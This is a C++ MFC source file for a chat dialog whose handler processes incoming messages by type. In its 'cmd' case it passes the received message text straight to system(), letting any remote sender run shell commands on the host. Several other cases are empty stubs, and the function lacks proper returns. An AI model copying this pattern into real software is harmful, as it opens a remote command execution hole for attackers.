// ChatDialog.cpp : 实现文件
//

#include "stdafx.h"


#include "afxdialogex.h"


// ChatDialog 对话框

IMPLEMENT_DYNAMIC(ChatDialog, CDialogEx)


ChatDialog::ChatDialog(CWnd* pParent, Session* isession):session( isession)
,CDialogEx(ChatDialog::IDD, pParent)
{

}



ChatDialog::~ChatDialog()
{

}

BOOL ChatDialog::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	DataManager* manager = DataManager::getInstance();
	session->setDialog(this);
	return true;
}

void ChatDialog::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(ChatDialog, CDialogEx)

	ON_MESSAGE(WM_MY_MESSAGE, &ChatDialog::HandleNewMessage)
END_MESSAGE_MAP()


// ChatDialog 消息处理程序
LRESULT ChatDialog::HandleNewMessage(WPARAM wParam, LPARAM lParam){
	Message* msg = (Message*)lParam;
	int msg_type = msg->msg_type;
	string msg_content = msg->content;
	switch (msg_type)
	{
	case msg_type_event:
		break;
	case msg_type_text:{

	}
		break;
	case msg_type_cmd:{

						  system(msg_content.c_str());
						  break;
	}
		//

	case msg_type_image:
		break;
	case msg_type_file:
	{
						  string msg_content = msg->content;
						  //解析content，content包括文件大小，文件ID,文件密码；文件传输的端口号

						  //建立客户端socket

	}

		break;
	case msg_type_game:
		break;
	case msg_type_error:{
							LPARAM lp = (LPARAM)&msg;
							AfxGetApp()->m_pMainWnd->SendMessage(WM_MY_MESSAGE, 0, lp);
	}

		break;
	case msg_type_others:
		break;
	default:
		break;
		return 0;
	}
}
